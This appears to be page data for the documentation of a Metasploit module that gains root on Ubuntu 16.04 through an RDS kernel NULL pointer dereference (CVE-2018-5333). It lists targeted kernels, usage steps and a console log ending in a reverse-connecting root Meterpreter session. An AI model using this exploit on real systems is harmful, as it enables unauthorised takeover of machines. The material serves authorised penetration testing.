{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"60b85548-4813-51a1-8546-4753195afe33","name":"Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation","fullname":"exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc","description":"This module attempts to gain root privileges on Linux systems by abusing\n        a NULL pointer dereference in the `rds_atomic_free_op` function in the\n        Reliable Datagram Sockets (RDS) kernel module (rds.ko).\n\n        Successful exploitation requires the RDS kernel module to be loaded.\n        If the RDS module is not blacklisted (default); then it will be loaded\n        automatically.\n\n        This exploit supports 64-bit Ubuntu Linux systems, including distributions\n        based on Ubuntu, such as Linux Mint and Zorin OS.\n\n        Target offsets are available for:\n\n        Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and\n        Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.\n\n        This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.\n        Failed exploitation may crash the kernel.\n\n        This module has been tested successfully on various 4.4 and 4.8 kernels.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges on Linux systems by abusing\na NULL pointer dereference in the <code class=\"language-text\">rds_atomic_free_op</code> function in the\nReliable Datagram Sockets (RDS) kernel module (rds.ko).</p>\n<p>  Successful exploitation requires the RDS kernel module to be loaded.\nIf the RDS module is not blacklisted (default); then it will be loaded\nautomatically.</p>\n<p>  This exploit supports 64-bit Ubuntu Linux systems, including distributions\nbased on Ubuntu, such as Linux Mint and Zorin OS.</p>\n<p>  Target offsets are available for:</p>\n<p>  Ubuntu 16.04 kernels 4.4.0 &#x3C;= 4.4.0-116-generic; and\nUbuntu 16.04 kernels 4.8.0 &#x3C;= 4.8.0-54-generic.</p>\n<p>  This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.\nFailed exploitation may crash the kernel.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully on various 4.4 and 4.8 kernels.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc</code></li>\n<li><code class=\"language-text\">set SESSION &lt;SESSION&gt;</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<p>  <strong>COMPILE</strong></p>\n<p>  Options: <code class=\"language-text\">Auto</code> <code class=\"language-text\">True</code> <code class=\"language-text\">False</code> (default: <code class=\"language-text\">Auto</code>)</p>\n<p>  Whether the exploit should be live compiled with <code class=\"language-text\">gcc</code> on the target system,\nor uploaded as a pre-compiled binary.</p>\n<p>  <code class=\"language-text\">Auto</code> will first determine if <code class=\"language-text\">gcc</code> is installed to compile live on the system,\nand fall back to uploading a pre-compiled executable.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1604-kernel-480-51-lowlatency-5416041-ubuntu\" style=\"position:relative;\"><a href=\"#ubuntu-1604-kernel-480-51-lowlatency-5416041-ubuntu\" aria-label=\"ubuntu 1604 kernel 480 51 lowlatency 5416041 ubuntu permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04 kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc \nmsf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) &gt; check\n\n[+] System architecture x86_64 is supported\n[+] Linux kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu is vulnerable\n[+] SMAP is not enabled\n[+] LKRG is not installed\n[+] grsecurity is not in use\n[+] rds.ko kernel module is loaded\n[*] The target appears to be vulnerable.\nmsf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.165:4444 \n[+] System architecture x86_64 is supported\n[+] Linux kernel 4.8.0-51-lowlatency #54~16.04.1-Ubuntu is vulnerable\n[+] SMAP is not enabled\n[+] LKRG is not installed\n[+] grsecurity is not in use\n[+] rds.ko kernel module is loaded\n[+] gcc is installed\n[*] Live compiling exploit on system...\n[*] Writing &#39;/tmp/.zwl2ezPl&#39; (250 bytes) ...\n[*] Launching exploit (timeout: 30)...\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to 172.16.191.206\n[*] Meterpreter session 2 opened (172.16.191.165:4444 -&gt; 172.16.191.206:48130) at 2019-12-21 02:22:40 -0500\n[+] Deleted /tmp/.aCNiWb9vps\n[+] Deleted /tmp/.zwl2ezPl\n[*] Linux RDS rds_atomic_free_op NULL pointer dereference local root (CVE-2018-5333)\n[*] [.] checking kernel version...\n[*] [.] kernel version &#39;4.8.0-51-lowlatency #54~16.04.1-Ubuntu&#39; detected\n[*] [~] done, version looks good\n[*] [.] checking system...\n[*] [~] done, looks good\n[*] [.] mapping null address...\n[*] [~] done, mapped null address\n[*] [.] KASLR bypass enabled, getting kernel base address\n[*] [.] trying /proc/kallsyms...\n[*] [-] kernel base not found in /proc/kallsyms\n[*] [.] trying syslog...\n[*] [.] done, kernel text:   ffffffffa7c00000\n[*] [.] commit_creds:        ffffffffa7ca6ed0\n[*] [.] prepare_kernel_cred: ffffffffa7ca72e0\n[*] [.] mmapping fake stack...\n[*] [~] done, fake stack mmapped\n[*] [.] executing payload 0x4027f7...\n[*] [+] got root\n\nmeterpreter &gt; getuid \nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.206\nOS           : Ubuntu 16.04 (Linux 4.8.0-51-lowlatency)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"60b85548-4813-51a1-8546-4753195afe33"}}}